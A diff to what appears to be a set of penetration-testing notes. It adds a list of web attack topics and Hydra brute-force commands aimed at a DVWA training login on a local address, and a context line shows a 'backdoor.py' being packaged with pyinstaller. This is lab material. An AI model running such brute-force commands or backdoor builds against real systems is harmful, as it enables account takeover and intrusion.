@@ -111,4 +111,16 @@ $ pyinstaller backdoor.py --onefile --noconsole
 * burpsuite
 * ShellShock
 * Command Injection
-* 
+* Reflected XSS
+* Stored XSS
+* HTML Injection
+* SQL Injection
+* CSRF Vulnerability
+* Hydra Bruteforce Attack
+```bash
+hydra -h
+hydra 192.168.1.9 http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=submit:Login failed" -L usernames.txt -P passwords.txt
+# Include cookie values
+hydra 192.168.1.9 http-get-form "/dvwa/valnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H-Cookie: security=low; PHPSESSID=de86e1e9f8e1f54dfed367fd82665aaa" -L usernames.txt -P passwords.txt
+```
+
